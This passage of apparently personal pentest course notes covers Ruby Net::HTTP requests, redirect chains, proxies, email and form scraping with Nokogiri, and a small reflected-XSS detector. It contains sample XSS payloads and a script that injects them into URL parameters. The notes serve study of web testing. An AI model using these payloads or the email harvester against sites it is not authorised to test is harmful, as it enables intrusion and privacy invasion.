<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">resp</span> <span class="o">=</span> <span class="n">https</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
</code></pre></div></div>

<p>Another way to handle https connection is by using <strong>start</strong> method:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">https</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">start</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="nf">host</span><span class="p">,</span><span class="n">url</span><span class="p">.</span><span class="nf">port</span><span class="p">,</span><span class="ss">:use_ssl</span><span class="o">=&gt;</span><span class="kp">true</span><span class="p">)</span>
</code></pre></div></div>

<p>→  moreover = http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html</p>

<h3 id="redirection">Redirection</h3>
<p>One common usage is For security reasons - the typical HTTP to HTTPS redirection. For example, if er request a website login page using HTTP, we could be automatically redirected to the HTTPS page.</p>

<ul>
  <li>the script will print the redirection chain to the standard output.</li>
  <li>usually responses are <strong>Moved Permanently 301</strong> or <strong>Moved Temporarly 302</strong>. in this cases, the location header specifie where the resource can be found.</li>
</ul>

<p>If we send a <strong>GET</strong> request, we have the message and the location header:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="no">URI</span><span class="p">(</span><span class="s2">"http://justcrypt.it"</span><span class="p">))</span>
<span class="n">res</span><span class="p">[</span><span class="s1">'location'</span><span class="p">]</span>
<span class="c1"># Output: 'https://justcryit.com'</span>
</code></pre></div></div>

<p>We have to follow the request:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">url</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"https://justcrypt.it"</span><span class="p">)</span>
<span class="n">resp</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">start</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="nf">host</span><span class="p">,</span><span class="n">url</span><span class="p">.</span><span class="nf">port</span><span class="p">,</span><span class="ss">:use_ssl</span><span class="o">=&gt;</span><span class="kp">true</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">https</span><span class="o">|</span>
  <span class="n">https</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
<span class="k">end</span>
<span class="n">resp</span><span class="p">[</span><span class="s1">'location'</span><span class="p">]</span>
<span class="c1"># Output: 'https://justcrypt.it/send'</span>

</code></pre></div></div>

<p>We have to follow the redirection chain until we receive an HTTPOK response (code 200):</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">url</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"https://justcrypt.it/send"</span><span class="p">)</span>
<span class="n">resp</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">start</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="nf">host</span><span class="p">,</span><span class="n">url</span><span class="p">.</span><span class="nf">port</span><span class="p">,</span><span class="ss">:use_ssl</span><span class="o">=&gt;</span><span class="kp">true</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">https</span><span class="o">|</span>
  <span class="n">https</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="nf">path</span><span class="p">)</span>
<span class="k">end</span>
<span class="c1"># Output: 'HTTPOK 200 OK readbody=true'</span>
</code></pre></div></div>

<h4 id="follow-the-chain">Follow the chain</h4>
<p>We can make a script to automatically that follows the chain of a given target address</p>

<p>First the function that is able to follow the redirection chain, ans its able to identify both http and https connection type:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'net/http'</span>

<span class="no">Target</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">follow_chain</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">block</span><span class="p">)</span>
  <span class="n">resp</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">start</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="nf">host</span><span class="p">,</span> <span class="n">url</span><span class="p">.</span><span class="nf">port</span><span class="p">,</span> <span class="ss">use_ssl: </span><span class="n">url</span><span class="p">.</span><span class="nf">scheme</span> <span class="o">==</span> <span class="s1">'https'</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">https</span><span class="o">|</span>
    <span class="n">https</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="nf">path</span><span class="p">)</span>
  <span class="k">end</span>
  <span class="n">block</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">resp</span><span class="p">)</span>
  <span class="n">follow_chain</span><span class="p">(</span><span class="no">URI</span><span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="s1">'location'</span><span class="p">]),</span> <span class="o">&amp;</span><span class="n">block</span><span class="p">)</span> <span class="k">if</span> <span class="n">resp</span><span class="p">.</span><span class="nf">is_a?</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTPRedirection</span>
<span class="k">end</span>

<span class="nb">puts</span> <span class="s2">"Starting from: </span><span class="si">#{</span><span class="no">Target</span><span class="si">}</span><span class="se">\n\n</span><span class="s2">"</span>
<span class="n">follow_chain</span><span class="p">(</span><span class="no">URI</span><span class="p">(</span><span class="no">Target</span><span class="p">))</span> <span class="k">do</span> <span class="o">|</span><span class="n">url</span><span class="p">,</span> <span class="n">resp</span><span class="o">|</span>
  <span class="k">case</span> <span class="n">resp</span>
  <span class="k">when</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTPRedirection</span>
    <span class="nb">puts</span> <span class="s2">"Redirection to: </span><span class="si">#{</span><span class="n">resp</span><span class="p">[</span><span class="s1">'location'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span>
  <span class="k">when</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTPSuccess</span>
    <span class="nb">puts</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">HTTPOK: </span><span class="si">#{</span><span class="n">url</span><span class="p">.</span><span class="nf">to_s</span><span class="si">}</span><span class="s2">"</span>
  <span class="k">end</span>
<span class="k">end</span>


</code></pre></div></div>

<h3 id="proxies">Proxies</h3>
<p>It may be useful to use proxies (For example if u want to keep your anonymity)</p>

<p>→ list of free available proxies - http://www.freeproxylists.net/</p>

<ul>
  <li>in this example we gonna use proxy 62.68.95.14 on port 8080 - HTTP</li>
</ul>

<h4 id="http-proxies">Http Proxies</h4>

<p>First create a Net::HTTP instance:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">proxy_addr</span> <span class="o">=</span> <span class="s2">"62.68.95.14"</span>
<span class="n">proxy_port</span> <span class="o">=</span> <span class="mi">8080</span>
<span class="n">proxy</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"www.elearnsecurity"</span><span class="p">,</span> <span class="kp">nil</span><span class="p">,</span><span class="s2">"proxy_addr,proxy_port"</span><span class="p">)</span>
</code></pre></div></div>

<p>Then we can use the methods already seen to perform a request:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res</span> <span class="o">=</span> <span class="n">proxy</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
<span class="c1"># Output: 'HTTPOK 200'</span>
</code></pre></div></div>

<p>We can inspect the packets with wireshark:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nslookup</span> <span class="n">www</span><span class="p">.</span><span class="nf">elearnsecurity</span><span class="p">.</span><span class="nf">com</span>
</code></pre></div></div>

<h4 id="https-proxies">Https Proxies</h4>
<p>Choose a proxy that supports https connections</p>

<p>Is the same as http, but we have to use SSL:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">proxy_addr</span> <span class="o">=</span> <span class="s2">"92.245.170.248"</span>
<span class="n">proxy_port</span> <span class="o">=</span> <span class="mi">8080</span>
<span class="n">target</span> <span class="o">=</span> <span class="s2">"members.elearnsecurity.com"</span>
<span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">start</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="mi">443</span><span class="p">,</span><span class="n">proxy_addr</span><span class="p">,</span><span class="n">proxy_port</span><span class="p">,</span><span class="ss">:use_ssl</span><span class="o">=&gt;</span><span class="kp">true</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">https</span><span class="o">|</span>
  <span class="n">https</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
<span class="k">end</span>

<span class="c1"># Output: 'HTTPOK 200 ok'</span>
</code></pre></div></div>

<ul>
  <li>https proxies use the <strong>HTTP CONNECT Tunneling</strong></li>
  <li>the Net::HTTP class automatically encapsulate this particular protocol when u request an HTTPS resource using a proxy</li>
</ul>

<p>→ moreover = http://en.wikipedia.org/wiki/HTTP_tunnel#HTTP_CONNECT_Tunneling</p>

<h3 id="other-verbs">Other VERBS</h3>

<p>To use other verbs besides get and post, we use a Net::HTTP instance (there are not Net::HTTP class methods to do that)</p>

<h4 id="options">Options</h4>
<p>OPTIONS requests allow u to know the list of VERBs supported by a particular target web resource</p>

<p>Start apache = service apache2 start</p>

<p>Show the verbs available:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">)</span>
<span class="n">opt</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="nf">options</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
<span class="n">opt</span><span class="p">.</span><span class="nf">to_hash</span>
<span class="c1"># in the allow output ['options, get, head, post']</span>
</code></pre></div></div>

<p>We can obtain the same result using an Net::HTP::Options request object. its a subclass of HttpRequest:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">)</span>
<span class="n">req</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">::</span><span class="no">Options</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
<span class="n">opt</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="nf">request</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
<span class="n">opt</span><span class="p">.</span><span class="nf">to_hash</span>
</code></pre></div></div>

<p>Sometimes verbs different from post and get are not allowed. Take google as an example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">opt</span><span class="p">.</span><span class="nf">class</span><span class="p">.</span><span class="nf">name</span>
<span class="c1"># Output: "Net:HTTPMethodNotAllowed" // does not allowed the options verb</span>
</code></pre></div></div>

<h4 id="head">HEAD</h4>
<p>Verb used to request only the resource response headers:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">)</span>
<span class="n">head</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="nf">head</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
<span class="n">head</span><span class="p">.</span><span class="nf">to_hash</span>
<span class="n">headh</span><span class="p">.</span><span class="nf">body</span>
<span class="c1"># Output: nil</span>
</code></pre></div></div>

<p>U can use the HttpRequest subclass request object <strong>Net::HTTP::Head</strong>:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">)</span>
<span class="n">req</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">::</span><span class="no">Head</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
<span class="n">head</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="nf">request</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
<span class="n">head</span><span class="p">.</span><span class="nf">to_hash</span>
</code></pre></div></div>

<h4 id="others">Others</h4>
<p>Check the references</p>

<p>→ http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html</p>

<h3 id="data-extraction">Data Extraction</h3>

<p>The extraction of the data depends on the type of response body: HTML, XML, JSON, private format, etc</p>

<p>We will use mainly regular expression or document parsing</p>

<h4 id="regular-expressions-1">Regular Expressions</h4>
<p>Whatever the response format is, with regular expression u can extract substrings that match a specific pattern (ignoring the format)</p>

<h4 id="email-extraction">email extraction</h4>
<p>If u have to perform a pentest that involves a web app, extracting emails is something that u would do
Usage:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="n">email_extr</span><span class="p">.</span><span class="nf">rb</span> <span class="o">&lt;</span><span class="n">url</span> <span class="n">target</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>The code using open-uri and scan method:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'open-uri'</span>

<span class="no">Target</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="no">Email_re</span> <span class="o">=</span> <span class="sr">/[-0-9a-zA-Z.+_]+@[-0-9a-zA-Z.+_]+\.[a-zA-Z]{2,4}/</span>
<span class="n">emails</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="no">Target</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">res</span><span class="o">|</span> <span class="n">res</span><span class="p">.</span><span class="nf">read</span><span class="p">.</span><span class="nf">scan</span><span class="p">(</span><span class="no">Email_re</span><span class="p">)}</span>
<span class="n">emails</span><span class="p">.</span><span class="nf">each</span> <span class="p">{</span> <span class="o">|</span><span class="n">email</span><span class="o">|</span> <span class="nb">puts</span> <span class="n">email</span><span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>U can also check invisible contents such as comments or hidden elements</p>
</blockquote>

<h3 id="document-parsing">Document Parsing</h3>
<p>Sometimes is better to parse through the node structure of the document</p>

<h4 id="nokogiri">Nokogiri</h4>
<p>→ http://nokogiri.org/</p>

<ul>
  <li>Nokogiri is an HTML, SAX, and Reader parser. search documents via XPath or CSS3 selectors.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span> <span class="no">Xpath</span> 
 <span class="err">→</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">w3</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="no">TR</span><span class="o">/</span><span class="n">xpath</span><span class="o">/</span>
 <span class="err">→</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">w3schools</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">xml</span><span class="o">/</span><span class="n">xpath_intro</span><span class="p">.</span><span class="nf">asp</span>

<span class="o">-</span> <span class="no">CSS3</span> <span class="ss">selector:
 </span><span class="err">→</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">w3</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="no">TR</span><span class="o">/</span><span class="n">selectors</span><span class="o">/</span>
 <span class="err">→</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">w3schools</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">cssref</span><span class="o">/</span><span class="n">css_selectors</span><span class="p">.</span><span class="nf">asp</span>
</code></pre></div></div>

<p>Installation:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gem</span> <span class="n">install</span> <span class="n">nokogiri</span>
</code></pre></div></div>

<p>Documentation &amp; tutorials:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">nokogiri</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">tutorials</span>
</code></pre></div></div>

<p>Example: Form Extraction:</p>

<p>Usage:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">ruby</span> <span class="n">form_extr</span><span class="p">.</span><span class="nf">rb</span> <span class="o">&lt;</span><span class="n">url</span><span class="o">&gt;</span>

<span class="nb">require</span> <span class="s1">'open-uri'</span>
<span class="nb">require</span> <span class="s1">'nokogiri'</span>

<span class="no">Target</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

<span class="c1"># Get the response body from the target resource via open-uri and parse the result HTML document using Nokogiri</span>
<span class="n">doc</span> <span class="o">=</span> <span class="no">Nokogiri</span><span class="o">::</span><span class="no">HTML</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="no">Target</span><span class="p">))</span>

<span class="c1"># The xpath method returns an array of Nokogiri nodes</span>
<span class="n">doc</span><span class="p">.</span><span class="nf">xpath</span><span class="p">(</span><span class="s2">"//form"</span><span class="p">).</span><span class="nf">each_with_index</span> <span class="k">do</span> <span class="o">|</span><span class="n">form</span><span class="p">,</span> <span class="n">i</span><span class="o">|</span>
  <span class="nb">puts</span> <span class="s2">"------- FORM </span><span class="si">#{</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s2"> ---------- "</span>
  <span class="nb">puts</span> <span class="s2">"Action: "</span> <span class="o">+</span> <span class="n">form</span><span class="p">[</span><span class="s1">'action'</span><span class="p">]</span>
  <span class="nb">puts</span> <span class="s2">"Method: "</span> <span class="o">+</span> <span class="n">form</span><span class="p">[</span><span class="s1">'method'</span><span class="p">]</span>
  <span class="nb">puts</span> <span class="s2">"FIELD"</span>
  <span class="n">form</span><span class="p">.</span><span class="nf">xpath</span><span class="p">(</span><span class="s2">".//input"</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">input</span><span class="o">|</span>
    <span class="nb">puts</span> <span class="s2">"Name: </span><span class="si">#{</span><span class="n">input</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span><span class="si">}</span><span class="s2"> - Type: </span><span class="si">#{</span><span class="n">input</span><span class="p">[</span><span class="s1">'type'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span>
  <span class="k">end</span>
  <span class="nb">puts</span>
<span class="k">end</span>


</code></pre></div></div>

<p>Example 2 - Detect XSS reflected:</p>

<p>Some browsers (i.e. chrome) have a built-in reflected xss filter that recognizes common payloads such as:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script&gt;
</span></code></pre></div></div>

<blockquote>
  <p>the easiest way is to parse the document using Nokogori to search the injected payload to see how it appears in the parsed tree.</p>
</blockquote>

<p>w/ interpreter:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'open-uri'</span>
<span class="nb">require</span> <span class="s1">'nokogiri'</span>
<span class="n">target</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"&lt;the full url with the &lt;script&gt; alert"</span><span class="p">)</span>
</code></pre></div></div>

<blockquote>
  <p>we can use open-uri and nokogiri to request the target resource using a GET request and to parse the html response body</p>
</blockquote>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">doc</span> <span class="o">=</span> <span class="no">Nokogiri</span><span class="o">::</span><span class="no">HTML</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>

<span class="no">If</span> <span class="n">we</span> <span class="n">have</span> <span class="n">a</span> <span class="s1">'script'</span> <span class="n">node</span> <span class="k">in</span> <span class="n">the</span> <span class="n">tree</span><span class="p">,</span> <span class="n">it</span> <span class="n">means</span> <span class="n">that</span> <span class="n">the</span> <span class="n">browser</span> <span class="n">parses</span> <span class="n">it</span> <span class="n">as</span> <span class="n">a</span> <span class="n">script</span> <span class="n">node</span> <span class="n">too</span> <span class="ow">and</span> <span class="n">executes</span> <span class="n">its</span> <span class="ss">code:
</span><span class="n">alert</span><span class="p">(</span><span class="mi">12345</span><span class="p">)</span>
<span class="c1"># another strategy is to search the string alert(12345) and check if its contained in a script node</span>
<span class="c1"># nokogiri treats text as a TextNode that must be contained in some ElementNode</span>
<span class="c1"># in this case, the ElementNode must be a script node while the TextNode must contains the string 'alert(12345)'</span>
</code></pre></div></div>

<ul>
  <li>With xpath query, we can search through all of the text nodes in order to find the one that contains the alert</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">text</span><span class="p">()[</span><span class="n">contains</span><span class="p">(.</span><span class="nf">,</span><span class="s1">' alert(12345)'</span><span class="p">)]</span>
</code></pre></div></div>

<p>Text is used to select all the text nodes of the entire html document</p>

<p>The [] brackets are used to extract nodes that satisfies a particular condition</p>

<p>Contains is a xpath function that checks if a particular string contains another string (first argument - second argument)</p>

<ul>
  <li>So For each text = (. point), it tests if cotnains the second argument (alert12345)</li>
</ul>

<p>We can execute the query to our parsed document using the xpath function:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">doc</span><span class="p">.</span><span class="nf">xpath</span><span class="p">(</span><span class="s2">"//text()[contains(.,' alert(12345)')]"</span><span class="p">)</span> 
</code></pre></div></div>

<p>// the output will be an array of nodes that satisfy our xpath query</p>

<p>We want to test if its parent is a script node:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">el</span> <span class="o">=</span> <span class="n">doc</span><span class="p">.</span><span class="nf">xpath</span><span class="p">(</span><span class="s2">"//text()[contains(.,' alert(12345)')]"</span><span class="p">)</span> 
<span class="n">el</span><span class="p">.</span><span class="nf">first</span>
<span class="n">el</span><span class="p">.</span><span class="nf">first</span><span class="p">.</span><span class="nf">parent</span>
<span class="n">el</span><span class="p">.</span><span class="nf">first</span><span class="p">.</span><span class="nf">parent</span><span class="p">.</span><span class="nf">name</span>
<span class="n">el</span><span class="p">.</span><span class="nf">first</span><span class="p">.</span><span class="nf">parent</span><span class="p">.</span><span class="nf">to_html</span>
</code></pre></div></div>

<p>We can see also the HTML code of the node that contains the injected script:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">el</span><span class="p">.</span><span class="nf">first</span><span class="p">.</span><span class="nf">parent</span><span class="p">.</span><span class="nf">parent</span><span class="p">.</span><span class="nf">to_html</span>
<span class="c1"># so we can confirm the we have inject a real script that will be executed by any browser</span>
</code></pre></div></div>

<h4 id="a-simple-tool-to-detect-xss">A simple Tool to detect XSS</h4>
<p>Usage:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="n">detect_xss</span><span class="p">.</span><span class="nf">rb</span> <span class="o">&lt;</span><span class="n">full</span> <span class="n">url</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">target</span> <span class="n">parameter</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">div</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="p">?</span><span class="n">php</span> <span class="n">echo</span> <span class="vg">$_GET</span><span class="p">[</span><span class="s1">'param'</span><span class="p">]</span> <span class="p">?</span><span class="o">&gt;&lt;</span><span class="sr">/div&gt;
&lt;div&gt; &lt;?php echp htmlspecialchars($_GET['param'],ENT_QUOTES, 'UTF-8') ?&gt; &lt;/</span><span class="n">div</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>// in the first div the script was injected correctly, but in the second one it was filtered.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">→</span> <span class="n">ruby</span> <span class="n">detect_xss</span><span class="p">.</span><span class="nf">rb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">localhost</span><span class="o">/</span><span class="n">xss1</span><span class="p">.</span><span class="nf">php?</span><span class="n">param</span><span class="o">=</span><span class="mi">123</span> <span class="n">param</span>


<span class="nb">require</span> <span class="s1">'nokogiri'</span>
<span class="nb">require</span> <span class="s1">'open-uri'</span>
<span class="nb">require</span> <span class="s1">'cgi'</span>

<span class="no">Target</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="no">Parameter</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="no">XSS_VECTORS</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"&lt;script&gt; alert(123456)&lt;/script&gt;"</span><span class="p">]</span>
<span class="no">Testing_Values</span> <span class="o">=</span> <span class="p">[</span><span class="s2">" alert(123456)"</span><span class="p">]</span>

<span class="no">Query</span> <span class="o">=</span> <span class="no">CGI</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="no">Target</span><span class="p">.</span><span class="nf">query</span><span class="p">)</span>

<span class="no">XSS_VECTORS</span><span class="p">.</span><span class="nf">zip</span><span class="p">(</span><span class="no">Testing_Values</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">vect</span><span class="p">,</span> <span class="nb">test</span><span class="o">|</span>
  <span class="no">Query</span><span class="p">[</span><span class="no">Parameter</span><span class="p">]</span> <span class="o">=</span> <span class="n">vect</span>
  <span class="no">Target</span><span class="p">.</span><span class="nf">query</span> <span class="o">=</span> <span class="no">URI</span><span class="p">.</span><span class="nf">encode_www_form</span><span class="p">(</span><span class="no">Query</span><span class="p">)</span>
  <span class="n">doc</span> <span class="o">=</span> <span class="no">Nokogiri</span><span class="o">::</span><span class="no">HTML</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="no">Target</span><span class="p">))</span>

  <span class="n">doc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="s2">"//text()[contains(.,'</span><span class="si">#{</span><span class="nb">test</span><span class="si">}</span><span class="s2">')]"</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">el</span><span class="o">|</span>
    <span class="k">if</span> <span class="n">el</span><span class="p">.</span><span class="nf">parent</span><span class="p">.</span><span class="nf">name</span> <span class="o">==</span> <span class="s1">'script'</span>
      <span class="nb">puts</span> <span class="s2">"------ Probable XSS found --------"</span>
      <span class="nb">puts</span> <span class="s2">"Injection Vector: </span><span class="si">#{</span><span class="n">vect</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
      <span class="nb">puts</span> <span class="s2">"FOUND IN THE FOLLOWING CODE"</span>
      <span class="nb">puts</span> <span class="n">el</span><span class="p">.</span><span class="nf">parent</span><span class="p">.</span><span class="nf">parent</span><span class="p">.</span><span class="nf">to_html</span>
      <span class="nb">puts</span> <span class="s2">"------------------------------------------"</span><span class="p">,</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">end</span>

</code></pre></div></div>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Sometimes</span> <span class="n">the</span> <span class="n">simple</span> <span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">work</span><span class="p">,</span> <span class="n">so</span> <span class="n">we</span> <span class="n">need</span> <span class="n">to</span> <span class="n">be</span> <span class="n">more</span> <span class="n">sophisticated</span>

<span class="no">Example</span><span class="p">:</span>

<span class="s1">' onclick=alert(12345) b='</span>
</code></pre></div></div>

<blockquote>
  <p>in case we have a code that does not filter single quotes</p>
</blockquote>

<h2 id="exercises">Exercises</h2>

<h3 id="1---cms-detection">1 - CMS Detection</h3>
<ul>
  <li>The first exercise u could do is to detect if a particular web app uses a CMS</li>
